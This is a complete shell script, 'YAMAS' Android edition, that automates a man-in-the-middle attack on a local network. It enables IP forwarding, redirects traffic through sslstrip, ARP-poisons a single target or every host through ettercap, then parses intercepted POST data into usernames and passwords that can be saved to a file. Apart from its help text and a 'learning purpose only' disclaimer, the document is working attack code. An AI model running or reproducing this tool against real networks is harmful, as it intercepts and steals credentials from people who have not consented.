#!/bin/sh

# Bash script to launch man it the middle attack and sslstrip.
# Based on yamas v0.9 by comaX for pcsci3ence.info
# Edited for android by J0hnny_b14z3

#Version information
version=yamadroid_1.0

# device variables
pathLog=~/yamas
pathApp=/opt/yamas

##grep to make sure path contains /usr/local/bin on bt5.img
if [[ ! -z `echo $PATH | grep /usr/local/bin` ]]
then
echo -n
else
export PATH=/usr/local/bin:$PATH
fi
# if user ^C then execute cleanup function
trap fast_cleanup SIGINT # will prolly output errors, but that's normal since it may try killing non-existing processes.

#Check if the script is being run as root
if [ "$(id -u)" != "0" ]; then
   echo -e "\033[31mYou are not running this script as root.\nPlease become root (e.g. \"su\") before launching this script\033[m"
   exit
fi

#####FUNCTIONS##########
#the looparse funtion is what actually strips the login data and makes it easily readable.. we have one for the real time feature and one for parsing a single captured file
#looparse function for a single capture file
looparsesingle(){
clear
echo
echo 'Note that %40 %21, etc. are ASCII chars. + means a space...\n'
   cat $parsepath |
         awk -F "(" '/POST Data/ {for (i=1;i<=NF;i++) if (match($i,/POST Data/)) n=i; print "Website = \t"$2; getline; print $n"\n"}' |
         awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
         egrep -i -a -f $pathApp/grepcred.txt |
         awk -F "=" '{if (length($2) < 4) print "";
            else if ($1 ~/Website/) print $0;
            else if ($1 ~/[Pp]/) print "Password = \t"$2"\n";
            else print "Login = \t"$2}' |
         uniq
	echo 
echo "***Press any key to return to the previous at any time...***"
	read -n 1 garbage 	
clear
}

#looparse function for real time parsing
looparse(){
while :
do
   clear
echo 'Note that %40 %21, etc. are ASCII chars. + means a space...'
echo
   cat $pathLog/$filename.txt |
         awk -F "(" '/POST Data/ {for (i=1;i<=NF;i++) if (match($i,/POST Data/)) n=i; print "Website = \t"$2; getline; print $n"\n"}' |
         awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
         egrep -i -a -f $pathApp/grepcred.txt |
         awk -F "=" '{if (length($2) < 4) print "";
            else if ($1 ~/Website/) print $0;
            else if ($1 ~/[Pp]/) print "Password = \t"$2"\n";
            else print "Login = \t"$2}' |
         uniq
echo
echo "Yamas is currently parsing traffic.. Passwords will show up here as they are discovered"
echo
echo -e "***Press '\033[31mq\033[m' or '\033[31mQ\033[m' to return to the main menu at any time...***"
read -t 5 -n 1 quitkey 	
break
done
}

#Check if the required dependencies exist. This should only run once
dep() {
   echo; echo -e "Checking for the needed dependencies:"
   echo -en "\tiptables\t\t\t"
   if dpkg -l | grep iptables 1>/dev/null; then 
     echo -e "\t\033[32m[Success]\033[m"
   else 
     echo -e "\t\033[31m[Failed!]\033[m"
     echo 0 >> ./test.txt
   fi
   echo -en "\tnmap\t\t\t"
   if dpkg -l | grep nmap 1>/dev/null; then 
     echo -e "\t\033[32m[Success]\033[m"
   else 
     echo -e "\t\033[31m[Failed!]\033[m"
     echo 0 >> ./test.txt
   fi
   echo -en "\tgrep\t\t\t"
   if dpkg -l | grep libpcre3 1>/dev/null; then 
     echo -e "\t\033[32m[Success]\033[m"
   else 
     echo -e "\t\033[31m[Failed!]\033[m"
     echo 0 >> ./test.txt
   fi
   echo -en "\tlibpcap\t\t\t"
   if dpkg -l | grep libpcap0.8 1>/dev/null; then 
     echo -e "\t\033[32m[Success]\033[m"
   else 
     echo -e "\t\033[31m[Failed!]\033[m"
     echo 0 >> ./test.txt
   fi
   echo -en "\tsslstrip\t\t\t"
   # "sslstrip" package doesn't exist. One has to compile on the machine or set the path therefore we do a simple check of existence in most common paths
   if [[ -e "/usr/bin/sslstrip" || -e "/usr/local/bin/sslstrip" || -e "/pentest/web/sslstrip" ]]; then          
     echo -e "\t\033[32m[Success]\033[m"
   else 
     echo -e "\t\033[31m[Failed!]\033[m"
     echo 0 >> ./test.txt
   fi
#ettercap needs more than to just be there so i threw in some notes about setting uid & gid and iptables rules
   echo -en "\tettercap\t\t\t"
   if dpkg -l | grep ettercap-common 1>/dev/null; then 
	if [[ ! -z `cat /etc/etter.conf | grep 'ec_uid = 0'` ]]
	then
	echo -e "\t\033[32m[Success]\033[m"
	echo -e "\033[38mNOTE:\033[m Your ec_uid is properly set to 0 but you must also uncomment the two iptables redirection commands under the Linux section (remove the # symbol at the beginning of the lines) or sniffing will fail. Do not uncomment the ipchains section unless you know what you're doing!" 
	echo
	echo "This message will only be viewed upon dependency checks"
	echo
	echo "*** Press any key to continue ***"
	read -n 1 garbage
   	else 
	echo -e "\t\033[31m[Failed!]\033[m"
	echo "***NOTE: Your /etc/etter.conf file must be edited to make ettercap function properly. You must make sure your UID and GID are set to 0 (root). You must also uncomment (remove the # symbol) the two iptables redirection commands under the Linux section or sniffing will fail. Do not uncomment ipchains unless you know what you're doing!"
     echo 0 >> ./test.txt
   fi
   else 
   echo -e "\t\033[31m[Failed!]\033[m"
   echo 0 >> ./test.txt
   fi
   echo -en "\tpython-twisted-web"
   if dpkg -l | grep python-twisted-web 1>/dev/null; then 
     echo -e "\t\033[32m[Success]\033[m"
   else 
     echo -e "\t\033[31m[Failed!]\033[m"
     echo 0 >> ./test.txt
   fi
   if [ ! -e "./test.txt" ]; then
      echo "All right ! Let's keep rolling..."
      echo 1 > $pathLog/.ok
   else
      rm ./test.txt
      if [ -e "$pathLog/.ok" ]; then rm $pathLog/.ok; fi
      echo "You are missing dependencies, this script will fail : exiting ! "
      sleep 3
      exit 0
   fi
}

# cleanup on ctrlc
fast_cleanup() {
   echo -e "\n\n\033[31m ^C catched. Cleaning up, then exit.\033[m"
   killall sslstrip &> /dev/null
   killall ettercap &> /dev/null
   killall ettercap &> /dev/null #I noticed this takes a few times to kill on occasion, no harm in an extra since everything goes to null!
   killall tail &> /dev/null
   echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
   iptables --flush                 # there are probably too many resets here,
   iptables --table nat --flush     # but at least we're sure everything's clean
   iptables --delete-chain
   iptables --table nat --delete-chain
   echo -e "\033[32m[-] Clean up successful !\033[m"
   exit 0
}
#cleanup on menu option #6 in final
cleanup() {
   echo
   echo -e "\033[31m[+] Killing processes and resetting iptable.\033[m"
   killall sslstrip &> /dev/null
   killall tail &> /dev/null
   killall ettercap &> /dev/null
   killall ettercap &> /dev/null #I noticed this takes a few times to kill on occasion, no harm in an extra!
   echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
   echo "IPv4 forwarding is now set to: [`cat /proc/sys/net/ipv4/ip_forward`]"
   iptables --flush                 # there are probably too many resets here,
   iptables --table nat --flush     # but at least we're sure everything's clean
   iptables --delete-chain
   iptables --table nat --delete-chain
   echo -e "\033[32m[-] Clean up successful !\033[m"
echo
#added this to speed up closing on unsuccessful capture session
while [ true ] ; do
echo -n "Would you like to save any captured data from this session? (y or n): "
read -n 1 saveit
if [[ $saveit == [yY] ]] ; then
   echo -e "\nDo you want to keep the whole log file for further use or shall we delete it? (Y=keep)"
   echo "(If you want to keep it, it will be stored in $pathLog/saved/$filename.txt)"
   read keep
   if [[ "$keep" = "Y" || "$keep" = "y" ]] ; then # double brackets because double condition. || signifies "or"
      mkdir $pathLog/saved/	
      cp $pathLog/$filename.txt $pathLog/saved/$filename.txt #moving file
         if [ -f "$pathLog/saved/$filename.txt" ]; then #check if it exists
            echo "Log file copied !" #it does
         else 
            echo "Error while copying log file. Go check /tmp/ for $filename.txt" #it does not
         fi
   else 
      echo "Logs not saved"
   fi
   echo
   echo "Do you want to save passwords to a file? (Y=keep)"
   echo "(If you want to keep it, it will be saved in $pathLog/saved/$filename.pass.txt)"
   read keeppd
   if [[ "$keeppd" = "Y" || "$keeppd" = "y" ]] ; then # double brackets because double condition. || signifies "or"
      mkdir $pathLog/saved/ 
      cat $pathLog/$filename.txt |
         awk -F "(" '/POST Data/ {for (i=1;i<=NF;i++) if (match($i,/POST Data/)) n=i; print "Website = \t"$2; getline; print $n"\n"}' |
         awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
         egrep -i -a -f $pathApp/grepcred.txt |
         awk -F "=" '{if (length($2) < 4) print "";
            else if ($1 ~/Website/) print $0;
            else if ($1 ~/[Pp]/) print "Password = \t"$2"\n";
            else print "Login = \t"$2}' |
         uniq >> $pathLog/saved/$filename.pass.txt # >> appends to a potential previous file.
      if [ -f "$pathLog/saved/$filename.pass.txt" ]; then #check if it exists
         echo "Passwords saved !" #it does
      else 
         echo "Error while saving passwords" #it does not
      fi
   else 
      echo "Password saving skipped."
   fi
break
elif [[ $saveit == [nN] ]] ; then
echo
echo -e "\033[38mNo password or captured data from this session will be saved!\033[m"
echo
break
else
echo
echo "Error!! Invalid input! Please type 'y' or 'n' to continue!"
echo
fi
done
   rm $pathLog/$filename.txt
   echo -e "Temporary files deleted."
clear
echo
echo -e "\e[1;32m[0_o] ***Droid Does!*** [o_0]" #it sure does! ;)
echo
exit 0
}
#rescanning with nmap
search=$(ip route show | awk '(NR == 1) { print $1}') #store gateway/24 for whole network mapping to variable
#We put it here in the middle, because it could be used two times, but the gateway shouldn't change,
#so there is no need to do it twice.
rescan () {
   echo -e "\033[31m"
   nmap -sP -T4 $search | grep "Host" | awk '{print$2}' #host discorvey
   echo -en "\033[m"
   final
}
#add or change target
add_target() {
killall ettercap 2> /dev/null
killall ettercap 2> /dev/null #sometimes it takes twice to kill ettercap for some reason.. maybe it hangs slightly on shutdown or something
read -p "Would you like to rescan with nmap to see what targets are live? (y or n): " updatedscan
echo
if [[ $updatedscan == [yY] ]]
then
echo "Scanning now.. this may take a few moments..."
   echo -e "\033[31m"
   nmap -sP -T4 $search | grep "Host" | awk '{print$2}' #host discorvey
   echo -en "\033[m"
echo
else
echo "Make sure to enter a valid address in IPv4 format.. ie 192.168.1.101"
fi
   echo -n "Type a new IP address to attack or press enter to poison the whole network: "
   read newip
if [[ $newip == "" ]] ; then
killall ettercap &> /dev/null #eliminate conflicts
etterfull
else
	echo
	killall ettercap &> /dev/null #eliminate conflicts
   echo "Poisoning $newip... This may take up to 10 seconds" 
   ettercap -q -i $int -T -P repoison_arp -M arp:remote  /$gateway/ /$newip/ 2> /dev/null &
   for i in `seq 0 8`; do echo -n '.'; sleep 1; done
   clear
   echo "Ettercap is now sniffing in the background.. Go check out the real time parsing option (5) from the main menu!"
   echo
fi
   final
}
#ascii chart does not format well on android screen.. I may try to edit and correct it but it's hard with small devices! you're better off googling this chart or reading it patiently haha
ascii() {
   clear
   cat $pathApp/ascii
   echo "Press any key to return to the main menu..."
   read -n 1 garbage
   clear
   final
}
#greps the log for hosts - You must have traffic moving on the victim machine for anything to show up.. otherwise it will be blank
tailsecure() {
tail -f $pathLog/$filename.txt | grep 'Resolving host:' 2> /dev/null & tailgrepid=$!
echo
echo "Press any key to stop grepping and return to the main menu..."
echo 
read -n 1 garbage
killall tail &> /dev/null
clear
final
}

#Removed a bunch of options here since we can only use one term for android. now you can simply re-launch or a parse a single log
rtparse() {
clear
   echo -e "\n\nIn this menu, you can re-launch realtime parsing (RTP).
   \033[31m1\033[m.) Re-launch RTP and sniff a running session
   \033[31m2\033[m.) Parse a log you've already recorded (sslstrip format)
   \033[31m3\033[m.) Main menu."
   echo -e "Enter the \033[31mnumber\033[m of your desired option: "
   read -n 1 rtp
if [[ $rtp == [123] ]] ; then
   if [ "$rtp" = "1" ] ; then
      echo -e "\033[32mLaunching...\033[m"
      quitkey=false
while [[ $quitkey != "q" && $quitkey != "Q" ]]
	do
	looparse
	done
	clear
	quitkey=false
      final
   elif [ "$rtp" = "2" ] ; then
	echo
	while [ true ]
	do
	echo "Logs must be in sslstrip format (default for yamas) and you need to supply the full path including '/' (ie /path/logname.txt)"
	read -p "Enter the full path of the log you wish to parse or type 'back': " parsepath
	if [[ -f $parsepath ]]
	then
	looparsesingle
	break
	elif [[ $parsepath == "back" ]]
	then
	break
	else
	echo "That file does not exist! Please check the path you entered and make sure it is complete or type 'back' to return to the previous menu now..."
	fi	
	done
	final
   elif [ "$rtp" = "3" ] ; then
      echo "Exiting to Main Menu..."
	sleep .5
	clear
      final
   fi
else echo -e "\033[31mBad choice bro !\033[m\n" #was "motherfucker" during my tests.
      rtparse
fi
}
#main menu
final() {
echo
   echo -e "\033[31mAttack is running\033[m. You can:
   \033[31m1\033[m.) Rescan network.
   \033[31m2\033[m.) Change target (useless if targeting whole network).
   \033[31m3\033[m.) Display ASCII correspondence table.
   \033[31m4\033[m.) Tail-grep hosts through output (make sure there's traffic)
   \033[31m5\033[m.) Real-time parsing...
   \033[31m6\033[m.) Quit properly.
"
 echo -e "Enter the \033[31mnumber\033[m of the desired option: "
   read -n 1 final
   if [ "$final" = "1" ] ; then
	echo
	echo "Rescanning the network for new hosts now... Please be patient..."
      rescan
   elif [ "$final" = "2" ] ; then
     add_target
   elif [ "$final" = "3" ] ; then
     ascii
   elif [ "$final" = "4" ] ; then
     tailsecure
   elif [ "$final" = "5" ] ; then
     rtparse
   elif [ "$final" = "6" ] ; then
     cleanup
   else 
      echo -e "\033[31mBad choice bro !\033[m\n" #was "motherfucker" during my tests.
	sleep 1
      final
   fi
}

#ettercap single target selected with repoison_arp plugin
ettercapi() { 
killall ettercap 2> /dev/null #no conflicts
echo "Poisoning $targetip"
echo
echo "It may take up to 10 seconds for ettercap to fully load.. please be patient..." 
sleep 1
ettercap -q -i $int -T -M arp:remote -P repoison_arp /$targetip/ /$gateway/ 2>/dev/null &
for i in `seq 0 8`; do echo -n '.'; sleep 1; done
echo -e "\033[33m Targeting $targetip on $gateway through $int.\033[m"
echo -e "[-] Arp cache poisoning is launched. "
echo -e "\033[31m Sit back and wait for traffic... \033[m"
sleep 2
}
#ettercap full scan with auto add plugin
etterfull(){
killall ettercap 2> /dev/null #no conflicts
echo "It may take up to 10 seconds for ettercap to fully load.. please be patient..."
sleep 1
ettercap -q -i $int -T -M arp:remote -P autoadd /$gateway/ // 2> /dev/null &
for i in `seq 0 8`; do echo -n '.'; sleep 1; done 
echo -e "\033[33m Targeting the whole network on $gateway on $int with Ettercap\033[m"
echo -e "[-] Arp cache poisoning is launched. "
echo -e "\033[31m Sit back and wait for traffic... \033[m"
sleep 2
}
###############################End of functions#############################

#check and see if it's been run before
if [ ! -e "$pathLog/.ok" ]; then dep ; fi
#Check if yamas folder exists, if not create it
if [ ! -d "$pathLog" ]; then
   mkdir $pathLog
fi
#make $pathApp if not already there
if [ ! -d $pathApp ] ; then
mkdir -p $pathApp
fi
#check for grepcred.txt in the right directory, if not there dl it
if [[ -e $pathApp/grepcred.txt ]] ; then
echo -n
else
echo "You do not have certain required files! Yamas will automatically down them for you now!"
echo "Please be patient, this may take a moment..."
echo
echo "Downloading grepcred.txt..."
wget -q http://comax.pagesperso-orange.fr/info/mitm/grepcred.txt -O $pathApp/grepcred.txt
fi
#check for ascii.txt and dl if it's not there
if [[ -e $pathApp/ascii ]] ; then
echo -n
else
echo "You do not have certain required files! Yamas will automatically down them for you now!"
echo "Please be patient, this may take a moment..."
echo
echo "Downloading ascii.txt..."
wget -q http://comax.pagesperso-orange.fr/info/mitm/ascii -O $pathApp/ascii
fi
#Let's define some arguments that can be passed to the script :
args=
while [ "$#" -ge 1 ] #check parameters
do
  case $1 in
   -d | --depend) # force check for dependencies
      clear
      dep # calling the function.
      ;;     
   -v | --version) #Print version and exits
      clear
      echo "YAMAS - Yet Another Man In The Middle Automation Script"
      echo "Version: $version"
      exit 0 ;;
   -p | --parse) #parse a given filename
      if [[ "$2" == "" ]]; then 
         echo -e "No input file given. Quitting. \nusage : $0 -p <file>"
         exit 0
      fi
      clear
      echo -e "Parsing $2 for credentials.\n\n"
parsepath=$2
      looparsesingle
	echo "No menu to return too... exiting now.."
	sleep 1
      exit 0 ;;
   -h | --help) #define help message
      clear 
      echo -e "You are running $0, YAMAS-ARM-Android.


usage : $0 <options>
   -d or --depend : Force check of required dependencies.
   -h or --help : Displays this help message, disclaimer and exit.
   -p <file> or --parse <file> : Only parse the given <file>.
             Don't use wildcards. Use > /output_file to print to a file.
   -v or --version : Show version and exit




\033[31m DISCLAIMER :\033[m
This program is intended for learning purpose only. I do not condone hacking 
and wouldn't be held responsible for your actions. Only you would face legal
consequences if you used this script for illegal activities.

\033[31m What I think should be learnt from this script :\033[m
This script should teach you how easy it is to steal sensitive online
credentials and how to protect you from it, provided you understand
what this program does. The best way to understand what it does is
to look at its source. This will also teach you basic shell scripting.

\033[31mFeatures :\033[m
- Compatible with android 2.2 or higher. Must have backtrack5 chroot img installed on sdcard
- Real time parsing of data in a single terminal
- Log parsing for user-friendly output.
- Network mapping for host discovery.
- Can save \"dumped\" passwords to file.
- Support for single target or all targets on the network.
- Can parse a single file. 
- All options know default, press enter til the end!
- Very neat and kewl ascii =D

\033[31m Credits :\033[m
Thanks to all people on backtrack forums for their help and support,
as well as maemo's for this version. 
Kudos to Unhuman for asking for this port and testing everything I asked him,
Torpedo, both script-wise and for his great demo video,
Saturn for making this script fully ash compliant and quite a load of stuff,
All the other people for their feedback, support, and help !
And google for being my best friend with scripting.
*Android Version: Ported and rescripted by J0hnny_b14z3

Please criticize this program or submit ideas on the official thread at
http://tinyurl.com/yamas-arm or send me a mail at contact.comax@gmail.com
*Contact J0hnny_b14z3 for Android issues at stainedhat@gmail.com

"
      exit ;;
   
   *) echo "Invalid parameters, continuing with script $0" & sleep 2 ;;
  esac
  shift
done

echo -e "\b
 #     #    #    #     #    #     #####  
  #   #    # #   ##   ##   # #   #     # 
   # #    #   #  # # # #  #   #  #       
    #    #     # #  #  # #     #  #####  
    #    ####### #     # #######       # 
    #    #     # #     # #     # #     # 
    #    #     # #     # #     #  #####
   Android Edition for Backtrack 5 on SD"
sleep 2
echo -e "================================================================
=\033[31m Welcome to Yet Another MITM Automation Script.\033[m 
=\033[31m Use this tool responsibly, and enjoy!\033[m          
= Feel free to contribute and distribute this as you please. 
= Official thread : http://tinyurl.com/yamas-arm
= Check out the help (-h) to see edition information
= You are running \033[32mYAMAS-android\033[m as: $USER
================================================================
Make sure you checked your dependencies with -d option before running this script"
echo
#get filename a little earlier.. this also gives a break in the script for people to read info
echo -e "Choose filename to output for this session : (default =\033[31m yamas \033[m)"
read filename
if [[ "$filename" = "" ]] ; then
   filename="yamas"
fi
echo
#set ports
while [ true ]
do
echo -e "Default ports of\033[31m 80 \033[mand\033[31m 8080 \033[mwill be used unless you specify other ports to sniff on..."
echo -en "Press enter for default ports \033[31m80\033[m/\033[31m8080\033[m or type '\033[31mset\033[m' to specify custom ports: "
read cports
if [[ $cports == "set" ]]
then
echo
echo -en "\033[31mTo \033[mwhat outport should the traffic be redirected to? This is the port sslstrip will run on. (press enter for default =\033[31m 8080 \033[m): "
read outport
echo
if [[ "$outport" = "" ]] ; then
   outport=8080
   echo -e "Port\033[31m $outport \033[mselected as default."
else
echo -e "You have selected to use port\033[31m $outport \033[mfor traffic redirection.. If this is not a valid port your sniffing will fail!"
fi
echo
echo -en "\033[31mFrom \033[mwhat arrival port should traffic be intercepted? (press enter for default =\033[31m 80 \033[m): "
read inport
echo
if [[ "$inport" = "" ]] ; then
   inport=80
   echo -e "Port\033[31m $inport \033[mselected as default."
else
echo -e "You have selected to use port\033[31m $inport \033[mfor traffic interception.. If this is not a valid incoming port like 80 or 443 your sniffing WILL fail!"
fi
echo
break

elif [[ $cports == "" ]]
then
inport=80
outport=8080
echo -e "Using default ports of: inport=\033[31m $inport \033[m outport=\033[31m $outport \033[m"
echo
break
else
echo "Error! Invalid input! Please press enter or type ''\033[31mset\033[m'' without quotes to continue..."
fi
done

#get interface
while [ true ]
do
tempint=$(ip route show | awk '(NR == 2) { print $5}')
echo -e "According to 'ip route show' your interface is: \033[31m$tempint\033[m"
echo -en "Type '\033[31mset\033[m' to manually enter a different interface or press enter to use \033[31m$tempint\033[m: "
read intchoice
if [[ $intchoice == "" ]]
then
int=$tempint
echo "It has been done.."
break
elif [[ $intchoice == "set" ]]
then
while [ true ]
do
#made it a case statement for speed reasons
echo "What interface would you like to sniff on? Select from an option below: "
echo -e "\033[31m1\033[m.) tiwlan0 "
echo -e "\033[31m2\033[m.) wlan0 "
echo -e "\033[31m3\033[m.) ppp0 "
echo -e "\033[31m4\033[m.) Enter your own "
echo
echo -en "Please enter the \033[31mnumber\033[m for your interface here: "
read -n 1 intopt
if [[ $intopt == [1234] ]]
then
case $intopt in
1) 
int=tiwlan0
break ;;
2) 
int=wlan0
break ;;
3) 
int=ppp0
break ;;
4)
echo
read -p "Enter the name of your wireless interface here: " int 
break ;;
esac
else
echo "Error!! Invalid input!! Enter a number from 1-4 to continue..."
fi
done
break
else
echo -e "Error!! Invalid input!! Type '\033[31mset\033[m' or press enter to continue..."
fi
done
echo -e "You have set yamas to sniff on interface\033[31m $int \033[m"
echo
#set gateway
ip route show | awk '(NR == 2) { print "Gateway :", $3,"    ", "Interface :", $5}' #Output IP route show user-friendly
gateway=$(ip route show | awk '(NR == 2) { print $3}') #store gateway ip
echo
echo -e "Type your gateway IP address or press enter to use\033[31m $gateway\033[m: "
read gateway
if [[ "$gateway" = "" ]] ; then
   gateway=$(ip route show | awk '(NR == 2) { print $3}') #restore gateway ip since pressing enter set our var to null
   echo -e "\033[31m $gateway\033[m selected as gateway.\n"
fi

# Starting fresh : reset IP forward and iptables
echo -e "\033[31m [+] Cleaning iptables \033[m"
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "[-] Cleaned."
echo

# IP forwarding
echo -e "\033[31m [+] Activating IP forwarding... \033[m"
echo "1" > /proc/sys/net/ipv4/ip_forward
echo "[-] Activated: ip_forward=[`cat /proc/sys/net/ipv4/ip_forward`]."
echo
sleep 1
#Iptables
echo -e "\033[31m [+] Configuring iptables... \033[m"
echo -e "\n\033[33m Traffic from port $inport will be redirected to port $outport \033[m"
iptables -t nat -A PREROUTING -p tcp --destination-port $inport -j REDIRECT --to-port $outport
echo "[-] Traffic rerouted"
sleep 1

#Sslstrip
echo
echo -e "\033[33mSslstrip will be listening on port $outport and outputting log in $pathLog/$filename.txt\033[m"
sslstrip -f -a -k -l $outport -w $pathLog/$filename.txt 2> /dev/null & sslstripid=$!
echo -n "Please be patient this may take a few seconds..."
for i in `seq 0 4`; do echo -n '.'; sleep 1; done #let time for sslstrip to launch. Might be a bit too much, but better prevent than heal.
echo
echo -e " [-] Sslstrip is now running in the background." # a bit redundant, but who cares?
echo

#ARP poisoning
echo -e "\033[31m [+] Activating ARP poisoning... \033[m"
sleep .5
#Target Ip selection and start of ettercap
while [ true ]
do
echo
echo -e "We will target every live host on the network by default."
echo -e "Discover hosts with nmap or enter an IP manually by typing '\033[31mset\033[m'."
echo -e "Press enter to target everything or type '\033[31mset\033[m' for nmap scan: " 
read -p "" choicearp
echo
if [[ $choicearp == "set" ]]
then
while [ true ] ; do
echo "Which would you like to do?"
echo
echo -e "\033[31m1\033[m.) Scan with nmap for live hosts"
echo -e "\033[31m2\033[m.) Manually set a target IP address"
echo -e "\033[31m3\033[m.) Target the entire network afterall"
echo
echo -en "Select the '\033[31mnumber\033[m' of your choice or press enter for default settings: "
read -n 1 scanopt
if [[ $scanopt == [123] ]] ; then
case $scanopt in
#1-nmap
1) echo
echo -e "[The scan may take up to 30 secs, please be patient]"
echo -e "\033[31m "
nmap -sP -T4 $search | grep "Host" | awk '{print$2}' #host discovery
echo -e "\033[m " # switch color back to white
echo -e "Please enter a single target to attack in IPv4 format: ie. 192.168.1.101"
echo -e "\033[31mIf you wish to attack multiple IP's then target the whole network by pressing enter now.\033[m"
echo "Enter single target IP address or press enter: "
read targetip
if [[ "$targetip" == "" ]]; then 
etterfull
else
ettercapi
fi
break ;;

#2-manually set an ip
2) echo
echo -e "Please enter a single live target to attack in IPv4 format: ie. 192.168.1.101"
echo -e "\033[31mIf you wish to attack multiple IP's then target the whole network by pressing enter now.\033[m"
echo "Enter single target IP address or press enter: "
read targetip
if [[ "$targetip" == "" ]]; then 
etterfull
else
ettercapi
fi
break ;;
#3-target whole network
3) echo
etterfull
break ;;
esac
else
echo
echo "Invalid Choice! Enter a number from 1-3"
echo
fi
done 
break
elif [[ $choicearp == "" ]]
then
etterfull
break
else
echo
echo -e "Error!! Invalid Entry!! Please type '\033[31mset\033[m' or press enter to continue..."
echo
fi
done
#end of gathering variables
echo
echo -e "\n\033[32m Attack should be running smooth! Captured data will be displayed as it is received, enjoy the show!\033[m"
sleep 3
echo
###START OF MAIN LOOPARSE FUNCTION###
if [[ $quitkey == "q" ]]
then
echo "Returning to main menu..."
quitkey=false
else
while [[ $quitkey != "q" && $quitkey != "Q" ]]
do
looparse
done 
fi
clear
final #call the "final" function which is the main menu
### End of the script fellas.